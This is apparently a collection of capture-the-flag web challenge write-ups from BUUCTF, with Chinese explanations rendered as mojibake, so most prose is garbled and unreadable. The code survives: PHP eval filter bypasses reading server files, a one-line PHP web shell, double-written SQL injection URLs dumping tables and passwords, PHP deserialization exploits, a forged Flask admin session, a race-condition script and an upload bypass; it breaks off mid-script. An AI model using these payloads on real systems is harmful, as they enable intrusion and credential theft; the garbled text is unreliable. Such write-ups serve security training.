## [RoarCTF 2019]Easy Calc

å¯åŠ¨ç¯å¢ƒï¼Œæ˜¯ä¸€ä¸ªç®€æ˜“è®¡ç®—å™¨ã€‚

å‘ç°apiåŠæºç `http://node3.buuoj.cn:28507/calc.php`

```php
 <?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>

```

æ­£åˆ™è¿‡æ»¤é»‘åå•ï¼Œ/m è¡¨ç¤ºå¤šè¡ŒæŸ¥æ‰¾

> ```
> /i (å¿½ç•¥å¤§å°å†™)
> /g (å…¨æ–‡æŸ¥æ‰¾å‡ºç°çš„æ‰€æœ‰åŒ¹é…å­—ç¬¦)
> /m (å¤šè¡ŒæŸ¥æ‰¾)
> /gi(å…¨æ–‡æŸ¥æ‰¾ã€å¿½ç•¥å¤§å°å†™)
> /ig(å…¨æ–‡æŸ¥æ‰¾ã€å¿½ç•¥å¤§å°å†™)
> ```

æµ‹è¯•ä¼ é€’å­—æ¯ä¹Ÿä¸è¡Œã€‚

**äº†è§£ä¸€ä¸‹phpçš„è§£æè§„åˆ™ï¼Œå½“phpè¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¦‚æœå˜é‡å‰é¢æœ‰ç©ºæ ¼ï¼Œä¼šå»æ‰å‰é¢çš„ç©ºæ ¼å†è§£æ**
**è€Œè¿™é‡Œé»‘åå•è¿‡æ»¤ï¼Œæ²¡æœ‰è¿‡æ»¤è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆä¹…å¯ä»¥æ„é€ ä¸€ä¸ªæŸ¥è¯¢è¯­å¥äº†**

è¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚

![image-20210405135216324](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405135223.png)

å¯ä»¥ä½¿ç”¨ chr()  å‡½æ•°ç»•è¿‡phpä»£ç æ­£åˆ™ã€‚

payload:

```txt
http://node3.buuoj.cn:28507/calc.php? num=1;var_dump(scandir(chr(47)))

http://node3.buuoj.cn:28507/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

## [æå®¢å¤§æŒ‘æˆ˜ 2019]Http

burpæ‰«åˆ°ä¸€ä¸ªphpæ–‡ä»¶

![image-20210405141332039](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405141332.png)

è®¿é—®

![image-20210405141410970](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405141411.png)

ä¸€æ­¥æ­¥ä¼ªé€ 

![image-20210405141648887](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405141649.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP

å¤‡ä»½ `www.zip`

index.php

```php
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```

class.php

```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

åˆç¢°åˆ°äº†ä»¥å‰çš„çŸ¥è¯†ç‚¹ã€‚

#### publicã€protectedä¸privateåœ¨åºåˆ—åŒ–æ—¶çš„åŒºåˆ«

> protected å£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š\0*\0çš„å‰ç¼€ã€‚è¿™é‡Œçš„ \0 è¡¨ç¤º ASCII ç ä¸º 0 çš„å­—ç¬¦(ä¸å¯è§å­—ç¬¦)ï¼Œè€Œä¸æ˜¯ \0 ç»„åˆã€‚è¿™ä¹Ÿè®¸è§£é‡Šäº†ï¼Œä¸ºä»€ä¹ˆå¦‚æœç›´æ¥åœ¨ç½‘å€ä¸Šï¼Œä¼ é€’\0*\0usernameä¼šæŠ¥é”™ï¼Œå› ä¸ºå®é™…ä¸Šå¹¶ä¸æ˜¯\0ï¼Œåªæ˜¯ç”¨å®ƒæ¥ä»£æ›¿ASCIIå€¼ä¸º0çš„å­—ç¬¦ã€‚

> **private** å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œ**ç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š\0çš„å‰ç¼€**ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦ã€‚å…¶ä¸­ \0 å­—ç¬¦ä¹Ÿæ˜¯è®¡ç®—é•¿åº¦çš„ã€‚

ä¹Ÿå°±æ˜¯è¯´å½“ä¸€ä¸ªç±»çš„å±æ€§å€¼å±æ€§ä¸º`public` æ—¶ï¼Œæ— å½±å“ï¼Œä¸º`protected`  æ—¶ä¼šåœ¨å…¶å‰é¢åŠ ä¸Šä¸å¯è§å­—ç¬¦ 0 .ä¸º`private` æ—¶ï¼Œä¼šåœ¨å…¶å‰é¢åŠ ä¸Š`\0` .

#### ç»•è¿‡__wakeupæ–¹æ³•

ä¸__sleep()å‡½æ•°ç›¸åï¼Œ__

sleep()å‡½æ•°ï¼Œæ˜¯åœ¨åºåºåˆ—åŒ–æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ã€‚

__wakeup()å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œè¢«è‡ªåŠ¨è°ƒç”¨ã€‚

**è¡¨ç¤ºå±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡ __wakeup å‡½æ•°çš„æ‰§è¡Œã€‚**

æ•…å†™è„šæœ¬

```php
<?php

class Name{
    private $username = '	';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

}

$a = new Name("admin","100");
$a = serialize($a);
$a = str_replace(2,3,$a);
echo urlencode($a);
?>
```

## [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload

æ–‡ä»¶ä¸Šä¼ ï¼Œç»•è¿‡

![image-20210405145627325](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405145627.png)

```php
<script language="php">
eval($_POST[1])
</script>
```

ä½†æ²¡æœ‰æ˜¾ç¤ºè·¯å¾„ï¼ŒçŒœæµ‹è·¯åŠ²ï¼Œ`/upload` ,å‘ç°ç›®å½•æ³„éœ²ï¼Œç¡®å®å­˜åœ¨ï¼Œ

è¿æ¥ä¸€å¥è¯ã€‚

![image-20210405145723595](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405145723.png)

## [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL

ç”¨æˆ·åå¯†ç `admin'or1--+  /   123456` 

ç›´æ¥æŠ¥é”™ã€‚

```txt
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1--' and password='123456'' at line 1
```

æ„é€ ä¸‡èƒ½æ³¨å…¥æœ‰é—®é¢˜ï¼Ÿ

å‘ç°è¿‡æ»¤äº† `or`

æµ‹è¯•ç”¨æˆ·å`admin' or 11or11` ä½†æ˜¯å›æ˜¾é”™è¯¯`'1111' and password='123456''` è¯´æ˜è¢«è¿‡æ»¤äº†ã€‚ åŒå†™æˆåŠŸç»•è¿‡

åç»­å‘ç°ç”¨æˆ·åå‡ºä¸å¤ªå¥½æ³¨å…¥ï¼Œè½¬åˆ°å¯†ç å¤„æ³¨å…¥ã€‚

å¯†ç å¤„`123456' oorr '1'='1`

![image-20210405151053315](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405151053.png)

æµ‹è¯•è¿˜è¿‡æ»¤äº†`by ï¼Œ union , select, from , where , or` ,æ³¨é‡Š--+ ï¼Œç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤ä¸ºç©ºäº†ã€‚

åˆ¤æ–­åˆ—ä¸º3

```txt
/check.php?username=admin&password=1'+oorrder+bbyy+3%23
```

payload

```txt
/check.php?username=admin&password=1'+uniunionon+selselectect+1,(seleselectct+group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema%3ddatabase()),3%23


/check.php?username=admin&password=1'+uniunionon+selselectect+1,(seleselectct+group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_name='b4bsql'),3%23


/check.php?username=admin&password=1'+uniunionon+selselectect+1,(seleselectct+group_concat(id,username,passwoorrd)+frfromom+b4bsql),3%23
```

## [ACTF2020 æ–°ç”Ÿèµ›]Upload

å³é”®æºç ï¼Œå‘ç°ä¸Šä¼ ç‚¹

![image-20210405153702359](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405153702.png)

åç¼€å`phtml` ç»•è¿‡

## [ACTF2020 æ–°ç”Ÿèµ›]BackupFile

æ‰«ç›®å½•ä¼šè¢«ğŸˆ²ã€‚

ç›²çŒœå¤‡ä»½æ–‡ä»¶

```txt
http://e3026dac-3357-4454-bc1b-f5e8228c8fb2.node3.buuoj.cn/index.php.bak
```

å¾—åˆ°

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

å¼±æ¯”è¾ƒï¼Œä¼ å‚123å³å¯ã€‚

## [HCTF 2018]admin

å³é”®æŸ¥çœ‹æºä»£ç ï¼Œè¯´ä¸æ˜¯admin .å¤§æ¦‚åº”è¯¥è¦è·å¾—adminè´¦å·æŠŠ

æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œåœ¨æ”¹å¯†ç æºç å¤„å‘ç°,ä¿¡æ¯æ³„éœ²

```txt
https://github.com/woadsl1234/hctf_flask/
```

ä¸‹è½½ä¸‹æ¥ï¼Œæ˜¯flashæ¡†æ¶ï¼Œ

> Flaskæ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è½»é‡çº§ Web åº”ç”¨æ¡†æ¶ã€‚å…¶ WSGI å·¥å…·ç®±é‡‡ç”¨ Werkzeug ï¼Œæ¨¡æ¿å¼•æ“åˆ™ä½¿ç”¨ Jinja2 ã€‚Flaskä½¿ç”¨ BSD æˆæƒã€‚

ç›´æ¥æ¥çœ‹è§£é¢˜æ–¹å¼ï¼Œå‚è€ƒï¼š 

```
https://blog.csdn.net/weixin_44677409/article/details/100733581
```

ä¸‰ç§è§£é¢˜æ–¹æ³•ï¼š

1. flask session ä¼ªé€ 
2. unicodeæ¬ºéª—
3. æ¡ä»¶ç«äº‰

ä¸‹è½½æºç åï¼ŒæŸ¥çœ‹è·¯ç”±

```python
@app.route('/code')
def get_code():

@app.route('/index')
def index():

@app.route('/register', methods = ['GET', 'POST'])
def register():

@app.route('/login', methods = ['GET', 'POST'])
def login():

@app.route('/logout')
def logout():

@app.route('/change', methods = ['GET', 'POST'])
def change():

@app.route('/edit', methods = ['GET', 'POST'])
def edit():
```

å­˜åœ¨ç™»å½•ã€æ³¨å†Œã€æ”¹å¯†ç ã€é€€å‡ºã€editè¿™å‡ ä¸ªåŠŸèƒ½.

#### flask session ä¼ªé€ 

flaskä¸­sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­çš„ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨åœ¨æœ¬åœ°ã€‚flaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚

çœ‹è¿™é‡Œ

> https://xz.aliyun.com/t/3569
>  https://www.leavesongs.com/PENETRATION/client-session-security.html#

åˆ©ç”¨è„šæœ¬å¯¹sessionè§£å¯†

```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

![image-20210405170729762](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405170729.png)

```txt
{'_fresh': True, '_id': b'420a195b52c07df404e28072b89758895ca01185760c22d745175edb853a77ea123b74a65378b17c91b8f6a37ae36f7676e9fe538cec749e27f21cbf817499b2', 'csrf_token': b'652716e9a324978495e477639e80431b9437b185', 'image': b'iBC6', 'name': '123456', 'user_id': '10'}
```



ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³è¦åŠ å¯†ä¼ªé€ ç”Ÿæˆè‡ªå·±æƒ³è¦çš„sessionè¿˜éœ€è¦çŸ¥é“SECRET_KEYï¼Œç„¶åæˆ‘ä»¬åœ¨config.pyé‡Œå‘ç°äº†SECRET_KEY

```python
SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
```

ç„¶ååœ¨index.htmlé¡µé¢å‘ç°åªè¦session[â€˜nameâ€™] == 'adminâ€™å³å¯ä»¥å¾—åˆ°flag

```html
{% if current_user.is_authenticated and session['name'] == 'admin' %}
<h1 class="nav">hctf{xxxxxxxxx}</h1>
{% endif %}
```

æ‰¾ä¸ªflask sessionåŠ å¯†çš„è„šæœ¬

```
https://github.com/noraj/flask-session-cookie-manager
```

åˆ©ç”¨åˆšåˆšå¾—åˆ°çš„SECRET_KEYï¼Œåœ¨å°†è§£å¯†å‡ºæ¥çš„nameæ”¹ä¸ºadminï¼Œæœ€åç”¨è„šæœ¬ç”Ÿæˆæˆ‘ä»¬æƒ³è¦çš„sessionå³å¯

![image-20210405171544471](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405171544.png)

å¾—åˆ°

```txt
.eJxFkEFrg0AQhf9KmbMHXfUSyKGwIhuYEcsa2b0Eq0azcVMwCYkb8t-7TaG9vpn3vXnzgN1-7s8jrC7ztQ9gd-hg9YC3T1gBcXFTMkupFhFavBH7sMTfQy1FgrxdlBlSclVS8GOkWHZDmSUkW4Y5LmjLmHh1J7eddC68TiO5bvK8BZmIKc8YSYyLXNyJYYq1SLTRI7pu1BKZNi0jp6ei1pPfSxTbGnJl6rNjbcRdsY0teOYzjqkyYg3PANrzvN9dvo796b-CqRZyGdNy8mgRFrJNvCXS0p_nlCvqylcpnY9PiWOsjK9Qrl-4g22G_o_UVBtOw-_k1Nj-R-rs4QQBXM_9_PobRCE8vwG5MGmi.YGrU6g.YFau9Cqu4gMU1rXELZcOSdY6YCE
```

![image-20210405171523027](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405171523.png)

#### Unicode æ¬ºéª—

ä»”ç»†è§‚å¯Ÿè·¯ç”±å‘ç°åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™å…ˆå°†nameè½¬æˆå°å†™

![image-20210405171731103](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405171731.png)

è·Ÿè¿›ä¸€ä¸‹registerã€login

![image-20210405171827088](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405171827.png)

![image-20210405171841241](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405171841.png)

å‘ç°éƒ½ç”¨strlower()æ¥è½¬å°å†™ï¼Œä½†æ˜¯pythonä¸­å·²ç»è‡ªå¸¦è½¬å°å†™å‡½æ•°lower()ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆä¸ä¸€æ ·çš„ï¼Œè·Ÿè¿›ä¸€ä¸‹strlowerå‡½æ•°

```python
def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

è¿™é‡Œç”¨çš„nodeprep.prepareå‡½æ•°ï¼Œè€Œnodeprepæ˜¯ä»Twistedæ¨¡å—å¯¼å…¥çš„ï¼Œåœ¨requirements.txtæ–‡ä»¶ä¸­å‘ç°`Twisted==10.2.0`ï¼Œè€Œå®˜ç½‘æœ€æ–°å·²ç»åˆ°äº†19.7.0(2019/9)ï¼Œç‰ˆæœ¬å·®è·å¾ˆå¤§ï¼Œåº”è¯¥ä¼šå­˜åœ¨æ¼æ´ã€‚

å…³äºUnicodeé—®é¢˜å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼šhttps://panda1g1.github.io/2018/11/15/HCTF%20admin/

![image-20210405172142578](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405172142.png)

ç„¶åæˆ‘ä»¬å‘ç°åœ¨ä½¿ç”¨nodeprep.prepareå‡½æ•°è½¬æ¢æ—¶è¿‡ç¨‹å¦‚ä¸‹ï¼š

```shell
á´¬á´°á´¹á´µá´º -> ADMIN -> admin
```

å‡å¦‚æˆ‘ä»¬æ³¨å†Œá´¬á´°á´¹á´µá´ºç”¨æˆ·ï¼Œç„¶ååœ¨ç”¨á´¬á´°á´¹á´µá´ºç”¨æˆ·ç™»å½•ï¼Œå› ä¸ºåœ¨loginå‡½æ•°é‡Œä½¿ç”¨äº†ä¸€æ¬¡nodeprep.prepareå‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬ç™»å½•ä¸Šå»çœ‹åˆ°çš„ç”¨æˆ·åä¸ºADMINï¼Œæ­¤æ—¶æˆ‘ä»¬å†ä¿®æ”¹å¯†ç ï¼Œåˆè°ƒç”¨äº†ä¸€æ¬¡nodeprep.prepareå‡½æ•°å°†nameè½¬æ¢ä¸ºadminï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥æ”¹æ‰adminçš„å¯†ç ï¼Œæœ€ååˆ©ç”¨adminè´¦å·ç™»å½•å³å¯æ‹¿åˆ°flagã€‚

#### æ¡ä»¶ç«äº‰

è¿™ä¸ªæ¼æ´åº”è¯¥æ˜¯å±äºä»£ç é€»è¾‘ä¸Šçš„æ¼æ´

![image-20210405172632495](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405172632.png)

åœ¨sessionèµ‹å€¼æ—¶ï¼Œç™»å½•ã€æ³¨å†Œéƒ½æ˜¯ç›´æ¥è¿›è¡Œèµ‹å€¼ï¼Œæœªè¿›è¡Œå®‰å…¨éªŒè¯ï¼Œä¹Ÿå°±å¯èƒ½å­˜åœ¨ä»¥ä¸‹ä¸€ç§å¯èƒ½ï¼š
æˆ‘ä»¬æ³¨å†Œä¸€ä¸ªç”¨æˆ·testï¼Œç°åœ¨æœ‰ä¸€ä¸ªè¿›ç¨‹1ä¸€ç›´é‡å¤è¿›è¡Œç™»å½•ã€æ”¹å¯†ç æ“ä½œï¼Œè¿›ç¨‹2ä¸€ç›´æ³¨é”€ï¼Œä¸”ä»¥adminç”¨æˆ·å’Œè¿›ç¨‹1æ‰€æ”¹çš„å¯†ç è¿›è¡Œç™»å½•ï¼Œæ˜¯ä¸æ˜¯æœ‰å¯èƒ½å½“è¿›ç¨‹1è¿›è¡Œåˆ°æ”¹å¯†ç æ“ä½œæ—¶ï¼Œè¿›ç¨‹2æ°å¥½æ³¨é”€ä¸”è¦è¿›è¡Œç™»å½•ï¼Œæ­¤æ—¶è¿›ç¨‹1æ”¹å¯†ç éœ€è¦ä¸€ä¸ªsessionï¼Œè€Œè¿›ç¨‹2åˆšå¥½å°†session[â€˜nameâ€™]èµ‹å€¼ä¸ºadminï¼Œç„¶åè¿›ç¨‹1è°ƒç”¨æ­¤sessionä¿®æ”¹å¯†ç ï¼Œå³ä¿®æ”¹äº†adminçš„å¯†ç ã€‚

ä¸è¿‡ä»ç†è®ºä¸Šæ¥è®²åº”è¯¥æ˜¯èƒ½å¤Ÿæ”¹æ‰adminçš„å¯†ç çš„ï¼Œå¯æ˜¯åœ¨å®é™…æµ‹è¯•å¹¶æ²¡æœ‰æˆåŠŸã€‚

```python
import requests
import threading

def login(s, username, password):
    data = {
        'username': username,
        'password': password,
        'submit': ''
    }
    return s.post("http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/login", data=data)

def logout(s):
    return s.get("http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/logout")

def change(s, newpassword):
    data = {
        'newpassword':newpassword
    }
    return s.post("http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/change", data=data)

def func1(s):
    login(s, 'test', 'test')
    change(s, 'test')

def func2(s):
    logout(s)
    res = login(s, 'admin', 'test')
    if 'flag' in res.text:
        print('finish')

def main():
    for i in range(1000):
        print(i)
        s = requests.Session()
        t1 = threading.Thread(target=func1, args=(s,))
        t2 = threading.Thread(target=func2, args=(s,))
        t1.start()
        t2.start()

if __name__ == "__main__":
    main()
```

æ‘˜æŠ„è‡ªï¼š https://blog.csdn.net/weixin_44677409/article/details/100733581

## [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag

pay.php ä¿¡æ¯æ³„éœ²

```html
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

å†çœ‹ä¸‹é¢˜ç›®æ„æ€ï¼Œé¦–å…ˆå¿…é¡»æ»¡è¶³æ¡ä»¶

```
If you want to buy the FLAG:
You must be a student from CUIT!!!
You must be answer the correct password!!! 
```

é¦–å…ˆæ˜¯å­¦ç”Ÿã€‚ã€‚ã€‚ã€‚

æŠ“åŒ…çœ‹äº†ï¼Œæœ‰ä¸ªuser=0 ,è‚¯å®šæœ‰é—®é¢˜ï¼Œæ”¹æˆ1è¯•è¯•ï¼Œ

![image-20210405174259341](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405174259.png)

![image-20210405174323306](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405174323.png)

æˆåŠŸï¼Œçœ‹ç¬¬äºŒä¸ªéªŒè¯ï¼Œ`Please input your password!!`  ,é‚£å°±æ˜¯ä¸å‰é¢çš„ä¿¡æ¯æ³„éœ²æœ‰å…³äº†ã€‚ç›´æ¥ç»•è¿‡

![image-20210405174426842](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405174426.png)

åœ¨å°±å¾—ä»˜é’±äº†ï¼Œä¼ å…¥moneyå‚æ•°ï¼Œæ˜¾ç¤ºå¤ªé•¿ã€‚ç§‘å­¦æŠ€æœ¯æ³•ï¼Œç»•è¿‡

![image-20210405174521051](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405174521.png)

![image-20210405174545167](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405174545.png)

çœ‹äº†ä¸‹å…¶ä»–å¸ˆå‚…çš„wp,æ˜¯

* strcmpæ¼æ´    æ•°ç»„ç»•è¿‡

* is_nummeric æ¼æ´

  is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ï¼

## [BJDCTF2020]Easy MD5

å¥—å¨ƒ

æç¤ºï¼Œè€ƒç‚¹md sqlæ³¨å…¥  ,ä¸¤ä¸ª payload

```
ffifdyop 

129581926211651571912466741651878684928
```



![image-20210405175406737](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405175406.png)

è·³è½¬

å³é”®æºä»£ç  ,md5å¼±æ¯”è¾ƒï¼Œæœç´¢å¼•æ“ `md5  0e` ï¼Œä¸€å¤§æ¨ã€‚

```html
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->

```



![image-20210405175657788](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405175657.png)

è·³è½¬

```php
 <?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
} 
```

md5å¼ºæ¯”è¾ƒï¼Œæ•°ç»„ç›´æ¥ç»•è¿‡

```
param2[]=1&param1[]=2
```

åŸç†æ˜¯md5ç­‰å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œå¯¼è‡´å‡½æ•°è¿”å›Nullã€‚è€ŒNullæ˜¯ç­‰äºNullçš„ï¼Œå¯¼è‡´äº†ç»•è¿‡ã€‚

## [SUCTF 2019]CheckIn

`.user.ini`ç»•è¿‡

```
GIF89a
auto_prepend_file=2.png
```

## [ZJCTF 2019]NiZhuanSiWei

```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

ç¬¬ä¸€é“é˜²çº¿

```
/?text=php://input

# POST
welcome to the zjctf
```

ç„¶ååˆ©ç”¨`include($file);` è¯»å– `useless.php` æºç ï¼Œ

å¾—åˆ°

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

ç„¶åæ„é€ payload

```php
<?php  

class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
$a = new Flag();
echo serialize($a);
?>  
```

æœ€ç»ˆpayload

```txt
/?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

# POST
welcome to the zjctf
```

## [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World

fuzzè¿‡æ»¤äº†å“ªäº›

![image-20210405194509099](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405194509.png)

472ä¸ºæ²¡æœ‰è¿‡æ»¤çš„ã€‚

ä½¿ç”¨å¼‚æˆ–æ³¨å…¥

```php
id=0^1  # å›æ˜¾  Hello, glzjin wants a girlfriend.
id=0^0  # å›æ˜¾  Error Occured When Fetch Result.   
```

æˆ–è€…

```
id=1=((ascii(substr((select(flag)from(flag)),1,1))>3)=1)=1
```



![image-20210405194744632](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/20210405194744.png)

å†™ä¸ªè„šæœ¬

```python
import requests
import time

